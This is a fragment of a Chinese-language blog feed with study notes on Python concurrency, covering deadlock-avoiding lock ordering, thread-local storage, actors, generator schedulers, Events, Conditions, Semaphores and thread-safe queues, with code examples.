<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">import threading</div><div class="line">class SharedCounter:</div><div class="line">    _lock = threading.RLock()</div><div class="line">    def __init__(self, initial_value=0):</div><div class="line">        self._value = initial_value</div><div class="line">        self._value_lock = threading.Lock()</div><div class="line">    def incr(self, delta=1):</div><div class="line">        with SharedCounter._lock:</div><div class="line">            self._value += delta</div><div class="line">    def decr(self, delta=1):</div><div class="line">        with SharedCounter._lock:</div><div class="line">            self.incr(-delta)</div></pre></td></tr></table></figure>
<h1 id="防止死锁的加锁机制"><a href="#防止死锁的加锁机制" class="headerlink" title="防止死锁的加锁机制"></a>防止死锁的加锁机制</h1><p>死锁是由于线程同时获取多个锁造成的，一个线程获取了第一个锁，然后在获取第二个锁的 时候发生阻塞，那么这个线程就可能阻塞其他线程的执行，从而导致整个程序假死。原来是这个意思，因为获得了第一个锁，所以该线程一直占用资源，但是阻塞又无法释放锁，所以造成死锁。阻塞的原因也可能是别的线程将这个锁占有，同时又需要上一个线程已经占用的锁。</p>
<p><strong><em>解决死锁问题的一种方案是为程序中的每一个锁分配一个唯一的id，然后只允许按照升序规则来使用多个锁</em></strong></p>
<p>使用上下文管理器：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">import threading</div><div class="line">from contextlib import contextmanager</div><div class="line"># Thread-local state to stored information on locks already acquired，保存线程的状态信息</div><div class="line">_local = threading.local()</div><div class="line">@contextmanager</div><div class="line">def acquire(*locks):</div><div class="line">    # Sort locks by object identifier</div><div class="line">    locks = sorted(locks, key=lambda x: id(x))</div><div class="line">    # Make sure lock order of previously acquired locks is not violated</div><div class="line">    acquired = getattr(_local,&apos;acquired&apos;,[])</div><div class="line">    # 保证已经获得的锁最大值不大于新获得的锁的id值</div><div class="line">    if acquired and max(id(lock) for lock in acquired) &gt;= id(locks[0]):</div><div class="line">        raise RuntimeError(&apos;Lock Order Violation&apos;)</div><div class="line">    acquired.extend(locks)</div><div class="line">    _local.acquired = acquired</div><div class="line">    try:</div><div class="line">        for lock in locks:</div><div class="line">            lock.acquire()</div><div class="line">        yield</div><div class="line">    finally:</div><div class="line">        # Release locks in reverse order of acquisition</div><div class="line">        ＃ 由大到小释放锁</div><div class="line">        for lock in reversed(locks):</div><div class="line">            lock.release()</div><div class="line">        del acquired[-len(locks):]</div></pre></td></tr></table></figure>
<p>使用这个上下文管理器，不管用户以什么顺序来请求锁，这些锁都会按照固定的顺序被获取。因此不会发生死锁</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">import threading</div><div class="line">x_lock = threading.Lock()</div><div class="line">y_lock = threading.Lock()</div><div class="line">def thread_1():</div><div class="line">    while True:</div><div class="line">        with acquire(x_lock, y_lock):</div><div class="line">            print(&apos;Thread-1&apos;)</div><div class="line">def thread_2():</div><div class="line">    while True:</div><div class="line">        with acquire(y_lock, x_lock):</div><div class="line">            print(&apos;Thread-2&apos;)</div><div class="line">t1 = threading.Thread(target=thread_1)</div><div class="line">t1.daemon = True</div><div class="line">t1.start()</div><div class="line">t2 = threading.Thread(target=thread_2)</div><div class="line">t2.daemon = True</div><div class="line">t2.start()</div></pre></td></tr></table></figure>
<p>尽可能保证每一个线程只能同时保持一个锁，这样就不会产生死锁。一个常用的死锁检测方案是看门狗计数器，线程正常运行的时候会每隔一段时间重置计数器，一旦发生死锁，无法重置计数器导致定时器超时，这样程序会重启自身恢复到正常状态。</p>
<p>避免死锁是另外一种解决死锁问题的方式，在进程获取锁的时候会严格按照对象id升序排列获取，经过数学证明，这样保证程序不会进入 死锁状态。单纯地按照对象id递增的顺序加锁不会产生循环依赖，而循环依赖是 死锁的一个必要条件，从而避免程序进入死锁状态。</p>
<p>哲学家进餐问题死锁避免：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">import threading</div><div class="line"># The philosopher thread</div><div class="line">def philosopher(left, right):</div><div class="line">    while True:</div><div class="line">        with acquire(left,right):</div><div class="line">             print(threading.currentThread(), &apos;eating&apos;)</div><div class="line"># The chopsticks (represented by locks)</div><div class="line">NSTICKS = 5</div><div class="line">chopsticks = [threading.Lock() for n in range(NSTICKS)]</div><div class="line"># Create all of the philosophers</div><div class="line">for n in range(NSTICKS):</div><div class="line">    t = threading.Thread(target=philosopher,</div><div class="line">                         args=(chopsticks[n],chopsticks[(n+1) % NSTICKS]))</div><div class="line">    t.start()</div></pre></td></tr></table></figure>
<h1 id="保存线程的状态信息"><a href="#保存线程的状态信息" class="headerlink" title="保存线程的状态信息"></a>保存线程的状态信息</h1><p>使用<code>thread.local()</code>创建一个本地线程存储对象。 对这个对象的属性的保存和读取操作都只会对执行线程可见，而其他线程并不可见。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line">from socket import socket, AF_INET, SOCK_STREAM</div><div class="line">import threading</div><div class="line">class LazyConnection:</div><div class="line">    def __init__(self, address, family=AF_INET, type=SOCK_STREAM):</div><div class="line">        self.address = address</div><div class="line">        self.family = AF_INET</div><div class="line">        self.type = SOCK_STREAM</div><div class="line">        self.local = threading.local()</div><div class="line">    def __enter__(self):</div><div class="line">        if hasattr(self.local, &apos;sock&apos;):</div><div class="line">            raise RuntimeError(&apos;Already connected&apos;)</div><div class="line">        self.local.sock = socket(self.family, self.type)</div><div class="line">        self.local.sock.connect(self.address)</div><div class="line">        return self.local.sock</div><div class="line">    def __exit__(self, exc_ty, exc_val, tb):</div><div class="line">        self.local.sock.close()</div><div class="line">        del self.local.sock        </div><div class="line">from functools import partial</div><div class="line">def test(conn):</div><div class="line">    with conn as s:</div><div class="line">        s.send(b&apos;GET /index.html HTTP/1.0\r\n&apos;)</div><div class="line">        s.send(b&apos;Host: www.python.org\r\n&apos;)</div><div class="line"></div><div class="line">        s.send(b&apos;\r\n&apos;)</div><div class="line">        resp = b&apos;&apos;.join(iter(partial(s.recv, 8192), b&apos;&apos;))</div><div class="line"></div><div class="line">    print(&apos;Got &#123;&#125; bytes&apos;.format(len(resp)))</div><div class="line"></div><div class="line">if __name__ == &apos;__main__&apos;:</div><div class="line">    conn = LazyConnection((&apos;www.python.org&apos;, 80))</div><div class="line"></div><div class="line">    t1 = threading.Thread(target=test, args=(conn,))</div><div class="line">    t2 = threading.Thread(target=test, args=(conn,))</div><div class="line">    t1.start()</div><div class="line">    t2.start()</div><div class="line">    t1.join()</div><div class="line">    t2.join()</div></pre></td></tr></table></figure>
<p>每个线程会创建一个自己专属的套接字连接（存储为self.local.sock）。 因此，当不同的线程执行套接字操作时，由于操作的是不同的套接字，因此它们不会相互影响。</p>
<p>比如一个套接字或文件。你不能让所有线程贡献一个单独对象， 因为多个线程同时读和写的时候会产生混乱。 本地线程存储通过让这些资源只能在被使用的线程中可见来解决这个问题。所以之前传递什么文件的时候，会出现问题。</p>
<h1 id="创建一个线程池"><a href="#创建一个线程池" class="headerlink" title="创建一个线程池"></a>创建一个线程池</h1><p>你应该避免编写线程数量可以无限制增长的程序。</p>
<p>服务器端程序也应该这样做，至少要限制进程创建的数目，最大应该是8，然后使用Condition对象或者event，等到一个进程结束运行后，然后再将阻塞的创建进程的函数解除阻塞。</p>
<p>不过进程与线程区别是，线程可以无限制创造，但是进程与硬件，处理器核心数有关。</p>
<h1 id="Python的全局锁问题"><a href="#Python的全局锁问题" class="headerlink" title="Python的全局锁问题"></a>Python的全局锁问题</h1><p>Python完全支持多线程编程， 但是解释器的C语言实现部分在完全并行执行时并不是线程安全的。怪不得需要全局解释器锁保护，确保任何时候都只有一个Python线程执行。 程序大部分只会设计到I/O，比如网络交互，那么使用多线程就很合适， 因为它们大部分时间都在等待。</p>
<p>依赖CPU的程序，优化底层算法要比使用多线程运行快得多。由于Python是解释执行的，如果你将那些性能瓶颈代码移到一个C语言扩展模块中， 速度也会提升的很快。</p>
<p>如果你准备使用一个处理器池，注意的是这样做涉及到数据序列化和在不同Python解释器通信。 被执行的操作需要放在一个通过def语句定义的Python函数中，并且函数参数和返回值必须要兼容pickle。</p>
<h1 id="定义一个Actor任务"><a href="#定义一个Actor任务" class="headerlink" title="定义一个Actor任务"></a>定义一个Actor任务</h1><p>actor最简单的并行和分布式计算解决方案，一个actor就是一个并发执行的任务，只是简单的执行发送给它的消息任务。响应这些消息时，它可能还会给其他actor发送更进一步的消息。 actor之间的通信是单向和异步的。</p>
<p>结合使用一个线程和一个队列可以很容易的定义actor</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div></pre></td><td class="code"><pre><div class="line">from queue import Queue</div><div class="line">from threading import Thread, Event</div><div class="line"></div><div class="line"># Sentinel used for shutdown</div><div class="line">class ActorExit(Exception):</div><div class="line">    pass</div><div class="line"></div><div class="line">class Actor:</div><div class="line">    def __init__(self):</div><div class="line">        self._mailbox = Queue()</div><div class="line">    def send(self, msg):</div><div class="line">        &apos;&apos;&apos;</div><div class="line">        Send a message to the actor</div><div class="line">        &apos;&apos;&apos;</div><div class="line">        self._mailbox.put(msg)</div><div class="line">    def recv(self):</div><div class="line">        &apos;&apos;&apos;</div><div class="line">        Receive an incoming message</div><div class="line">        &apos;&apos;&apos;</div><div class="line">        msg = self._mailbox.get()</div><div class="line">        if msg is ActorExit:</div><div class="line">            raise ActorExit()</div><div class="line">        return msg</div><div class="line">    def close(self):</div><div class="line">        &apos;&apos;&apos;</div><div class="line">        Close the actor, thus shutting it down</div><div class="line">        &apos;&apos;&apos;</div><div class="line">        self.send(ActorExit)</div><div class="line">    def start(self):</div><div class="line">        &apos;&apos;&apos;</div><div class="line">        Start concurrent execution</div><div class="line">        &apos;&apos;&apos;</div><div class="line">        self._terminated = Event()</div><div class="line">        t = Thread(target=self._bootstrap)</div><div class="line">        t.daemon = True</div><div class="line">        t.start()</div><div class="line">    def _bootstrap(self):</div><div class="line">        try:</div><div class="line">            self.run()</div><div class="line">        except ActorExit:</div><div class="line">            pass</div><div class="line">        finally:</div><div class="line">            self._terminated.set()</div><div class="line">    def join(self):</div><div class="line">        self._terminated.wait()</div><div class="line">    def run(self):</div><div class="line">        &apos;&apos;&apos;</div><div class="line">        Run method to be implemented by the user</div><div class="line">        &apos;&apos;&apos;</div><div class="line">        while True:</div><div class="line">            msg = self.recv()</div><div class="line"># Sample ActorTask</div><div class="line">class PrintActor(Actor):</div><div class="line">    def run(self):</div><div class="line">        while True:</div><div class="line">            msg = self.recv()</div><div class="line">            print(&apos;Got:&apos;, msg)</div><div class="line"># Sample use</div><div class="line">p = PrintActor()</div><div class="line"># 开启了一个线程，轮询</div><div class="line">p.start()</div><div class="line">p.send(&apos;Hello&apos;)</div><div class="line">p.send(&apos;World&apos;)</div><div class="line">p.close()</div><div class="line">p.join()</div></pre></td></tr></table></figure>
<h1 id="使用生成器代替线程"><a href="#使用生成器代替线程" class="headerlink" title="使用生成器代替线程"></a>使用生成器代替线程</h1><p>使用生成器（协程）替代系统线程来实现并发。这个有时又被称为用户级线程或绿色线程。yield 语句会让一个生成器挂起它的执行，这样就可以编写一个调度器， 将生成器当做某种“任务”并使用任务协作切换来替换它们的执行。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"># Two simple generator functions</div><div class="line">def countdown(n):</div><div class="line">    while n &gt; 0:</div><div class="line">        print(&apos;T-minus&apos;, n)</div><div class="line">        yield</div><div class="line">        n -= 1</div><div class="line">    print(&apos;Blastoff!&apos;)</div><div class="line">def countup(n):</div><div class="line">    x = 0</div><div class="line">    while x &lt; n:</div><div class="line">        print(&apos;Counting up&apos;, x)</div><div class="line">        yield</div><div class="line">        x += 1</div></pre></td></tr></table></figure>
<p>下面是一个简单任务调度器</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">from collections import deque</div><div class="line">class TaskScheduler:</div><div class="line">    def __init__(self):</div><div class="line">        self._task_queue = deque()</div><div class="line">    def new_task(self, task):</div><div class="line">        &apos;&apos;&apos;</div><div class="line">        Admit a newly started task to the scheduler</div><div class="line"></div><div class="line">        &apos;&apos;&apos;</div><div class="line">        self._task_queue.append(task)</div><div class="line">    def run(self):</div><div class="line">        &apos;&apos;&apos;</div><div class="line">        Run until there are no more tasks</div><div class="line">        &apos;&apos;&apos;</div><div class="line">        while self._task_queue:</div><div class="line">            task = self._task_queue.popleft()</div><div class="line">            try:</div><div class="line">                # Run until the next yield statement</div><div class="line">                next(task)</div><div class="line">                self._task_queue.append(task)</div><div class="line">            except StopIteration:</div><div class="line">                # Generator is no longer executing</div><div class="line">                pass</div><div class="line"># Example use</div><div class="line">sched = TaskScheduler()</div><div class="line">sched.new_task(countdown(10))</div><div class="line">sched.new_task(countdown(5))</div><div class="line">sched.new_task(countup(15))</div><div class="line">sched.run()</div></pre></td></tr></table></figure>
<p> 生成器函数就是认为，而yield语句是任务挂起的信号。调度器循环检查任务列表直到没有任务要执行为止。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;并发编程第二部分,并没有深入研究&lt;/p&gt;
&lt;h1 id=&quot;给关键部分加锁&quot;&gt;&lt;a href=&quot;#给关键部分加锁&quot; class=&quot;headerlink&quot; title=&quot;给关键部分加锁&quot;&gt;&lt;/a&gt;给关键部分加锁&lt;/h1&gt;&lt;p&gt;一次仅允许一个进程使用的资源称为临界资源。临界区内放
    
    </summary>
    
      <category term="Python" scheme="http://microndgt.github.io/categories/Python/"/>
    
    
      <category term="编程" scheme="http://microndgt.github.io/tags/%E7%BC%96%E7%A8%8B/"/>
    
      <category term="Python" scheme="http://microndgt.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Python并发编程</title>
    <link href="http://microndgt.github.io/2017/02/13/Python%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/"/>
    <id>http://microndgt.github.io/2017/02/13/Python并发编程/</id>
    <published>2017-02-13T04:49:52.000Z</published>
    <updated>2017-02-14T04:21:18.000Z</updated>
    
    <content type="html"><![CDATA[<p>多线程，调用子进程，生成器函数，并行计算</p>
<h1 id="启动和停止线程"><a href="#启动和停止线程" class="headerlink" title="启动和停止线程"></a>启动和停止线程</h1><p>threading库可以在单独的线程中执行任何的在Python中可以调用的对象，可以创建一个Thread对象并且将要执行的对象以target参数的形式提供给该对象。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">from threading import Thread</div><div class="line">t = Thread(target=countdown, args=(10, ))</div><div class="line">t.start()</div></pre></td></tr></table></figure>
<p>线程会在一个单独的系统级线程中执行，这些线程由操作系统全权管理，一旦启动，独立执行到目标函数返回。查询线程状态<code>t.is_alive()</code>，将一个线程加入到当前线程，等待它终止<code>t.join()</code></p>
<p>Python解释器在所有线程都终止后才继续执行代码，所以长时间运行的线程或者需要一直运行的后台任务，使用后台线程。<code>t = Thread(target=countdown, args=(10, ), daemon=True)</code></p>
<p>后台线程无法等待，但是这些线程会在主线程终止时候自动销毁，但是无法结束线程，必须自己写一个调度类来实现这些功能。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">class CountdownTask:</div><div class="line">    def __init__(self):</div><div class="line">        self.running = True</div><div class="line">    def terminate(self):</div><div class="line">        self.running = False</div><div class="line">    def run(self, n):</div><div class="line">        while self.running and n &gt; 0:</div><div class="line">            print(&quot;T-minus&quot;, n)</div><div class="line">            n -= 1</div><div class="line">            time.sleep(5)</div><div class="line">c = CountdownTask()</div><div class="line">t = Thread(target=c.run, args=(10,))</div><div class="line">t.start()</div><div class="line">c.terminate()</div><div class="line">t.join()</div></pre></td></tr></table></figure>
<p>如果线程执行I/O阻塞操作，name就应该使用超时循环来操作线程。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">class IOTask:</div><div class="line">    def terminate(self):</div><div class="line">        self._running = False</div><div class="line">    def run(self, sock):</div><div class="line">        sock.settimeout(5)</div><div class="line">        while self._running:</div><div class="line">            try:</div><div class="line">                data = sock.recv(8192)</div><div class="line">                break</div><div class="line">            except socket.timeout:</div><div class="line">                continue</div><div class="line">        return</div></pre></td></tr></table></figure>
<p>Python线程被限制到同一时刻只允许一个线程执行，所以Python线程更适用于I/O和其他需要并发执行的阻塞操作，而不是需要多处理器并行的计算密集型任务。</p>
<p>以下的实现的线程也可以工作，但是依赖于threading库，所以只能在线程上下文中使用，但是上面的与threading库无关，所以可以被用在其他上下文中，比如在multiprocessing单独进程中执行代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">from threading import Thread</div><div class="line">class CountdownTask(Thread):</div><div class="line">    def __init__(self, n):</div><div class="line">        super().__init__()</div><div class="line">        self.n = 0</div><div class="line">    def run(self):</div><div class="line">        while self.n &gt; 0:</div><div class="line">            self.n -= 1</div><div class="line">            time.sleep(5)</div></pre></td></tr></table></figure>
<h1 id="判断线程是否已经启动"><a href="#判断线程是否已经启动" class="headerlink" title="判断线程是否已经启动"></a>判断线程是否已经启动</h1><p>程序其他线程判断某个线程的状态来确定下一步，使用threading的Event来设置一个信号标志来协调线程的启动。初始状态为假。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">from threading import Thread, Event</div><div class="line">import time</div><div class="line">def countdown(n, started_evt):</div><div class="line">    print(&quot;starting&quot;)</div><div class="line">    # 在此设置event对象为真</div><div class="line">    started_evt.set()</div><div class="line">    while n &gt; 0:</div><div class="line">        print(&apos;t-minus&apos;)</div><div class="line">        n -= 1</div><div class="line">        time.sleep(2)</div><div class="line">started_evt = Event()</div><div class="line">print(&apos;launching countdown&apos;)</div><div class="line">t = Thread(target=countdown, args=(10, started_evt))</div><div class="line">t.start()</div><div class="line"># 为真后执行继续执行主线程</div><div class="line">started_evt.wait()</div><div class="line">print(&apos;running&apos;)</div></pre></td></tr></table></figure>
<p>event对象最好单次使用，一旦对象设置为真，就应该丢弃它。如果需要多次使用，则使用Condition对象代替。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line">import threading</div><div class="line">import time</div><div class="line">class PeriodcTimer:</div><div class="line">    def __init__(self, interval):</div><div class="line">        self._interval = interval</div><div class="line">        self._flag = 0</div><div class="line">        self._cv = threading.Condition()</div><div class="line">    def start(self):</div><div class="line">        t = threading.Thread(target=self.run)</div><div class="line">        t.daemon = True</div><div class="line">        t.start()</div><div class="line">    def run(self):</div><div class="line">        while True:</div><div class="line">            time.sleep(self._interval)</div><div class="line">            with self._cv:</div><div class="line">                self._flag ^= 1</div><div class="line">                self._cv.notify_all()</div><div class="line">    def wait_for_tick(self):</div><div class="line">        with self._cv:</div><div class="line">            last_flag = self._flag</div><div class="line">            while last_flag == self._flag:</div><div class="line">                # 当每次有notify_all时候结束循环,开始计数</div><div class="line">                self._cv.wait()</div><div class="line">ptiemr = PeriodcTimer(5)</div><div class="line">ptiemr.start()</div><div class="line">def countdown(nticks):</div><div class="line">    while nticks &gt; 0:</div><div class="line">        ptiemr.wait_for_tick()</div><div class="line">        print(&quot;T-minus&quot;, nticks)</div><div class="line">        nticks -= 1</div><div class="line">def countup(last):</div><div class="line">    n = 0</div><div class="line">    while n &lt; last:</div><div class="line">        ptiemr.wait_for_tick()</div><div class="line">        print(&quot;counting&quot;, n)</div><div class="line">        n += 1</div><div class="line">threading.Thread(target=countdown, args=(10, )).start()</div><div class="line">threading.Thread(target=countup, args=(5, )).start()</div></pre></td></tr></table></figure>
<p>event当它设置为真的时候会唤醒所有等待它的线程，如果只想唤醒单个线程，最好使用信号量或者Condition对象。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">def worker(n, sema):</div><div class="line">    sema.acquire()</div><div class="line">    print(&quot;working &quot;, n)</div><div class="line">sema = threading.Semaphore(0)</div><div class="line">nworkers = 10</div><div class="line">for n in range(nworkers):</div><div class="line">    # 会启动一个线程池，但是所有线程都在等待获取信号量</div><div class="line">    t = threading.Thread(target=worker, args=(n, sema, ))</div><div class="line">    t.start()</div><div class="line"># 每次释放信号量的时候，只有一个线程会唤醒并且执行</div><div class="line">sema.release()</div></pre></td></tr></table></figure>
<p>使用队列来进行线程间通信或者把每个线程当成一个Actor，使用Actor模型控制并发。</p>
<h1 id="线程间通信"><a href="#线程间通信" class="headerlink" title="线程间通信"></a>线程间通信</h1><p>从一个线程向另一个线程发送数据最安全的方式是使用queue库中的队列。创建一个被多个线程共享的Queue对象，这些线程通过使用put()和get()方法来向队列中添加或者删除元素。Queue中含有了必要的锁，可以在多个线程中安全地共享数据。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">from queue import Queue</div><div class="line">from threading import Thread</div><div class="line"># 哨兵</div><div class="line">_sentinel = object()</div><div class="line">def producer(out_q):</div><div class="line">    while running:</div><div class="line">        out_q.put(data)</div><div class="line">    out_q.put(_sentinel)</div><div class="line">def cousumer(in_q):</div><div class="line">    while True:</div><div class="line">        data = in_q.get()</div><div class="line">        if data is _sentinel:</div><div class="line">            # 再放回去，这样所有监听这个队列的消费者线程就可以都关闭了。</div><div class="line">            in_q.put(_sentinel)</div><div class="line">            break</div></pre></td></tr></table></figure>
<p>使用Condition变量来包装数据结构，创建一个线程安全的优先级队列</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">import heapq</div><div class="line">import threading</div><div class="line">class PriorityQueue:</div><div class="line">    def __init__(self):</div><div class="line">        self._queue = []</div><div class="line">        self._count = 0</div><div class="line">        self._cv = threading.Condition()</div><div class="line">    def put(self, item, priority):</div><div class="line">        with self._cv:</div><div class="line">            heapq.heappush(self._queue, (-priority, self._count, item))</div><div class="line">            self._count += 1</div><div class="line">            self._cv.notify()</div><div class="line">    def get(self):</div><div class="line">        with self._cv:</div><div class="line">            while len(self._queue) == 0:</div><div class="line">                # 在这里阻塞,而不是循环，直到添加元素后解除阻塞</div><div class="line">                self._cv.wait()</div><div class="line">            # 获取优先级最低的</div><div class="line">            return heapq.heappop(self._queue)[-1]</div></pre></td></tr></table></figure>
<p>使用task_done()和join()来表示已经完成,q.task_done()，每次从queue中get一个数据之后，当处理好相关问题，最后调用该方法，以提示q.join()是否停止阻塞，让线程向前执行或者退出；q.join()，阻塞，直到queue中的数据均被删除或者处理。为队列中的每一项都调用一次。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">from queue import Queue</div><div class="line">from threading import Thread</div><div class="line">def producer(out_q):</div><div class="line">    while running:</div><div class="line">        out_q.put(data)</div><div class="line">def cousumer(in_q):</div><div class="line">    while True:</div><div class="line">        data = in_q.get()</div><div class="line">        in_q.task_done()</div><div class="line">q = Queue()</div><div class="line">t2 = Thread(target=producer, args=(q, ))</div><div class="line">t1 = Thread(target=consumer, args=(q, ))</div><div class="line">t2.start()</div><div class="line">t1.start()</div><div class="line">q.join() #所有生产的都被消费</div></pre></td></tr></table></figure>
<p>使用event当消费者线程处理完数据后生产者立即得到通知，来监测处理过程。</p>
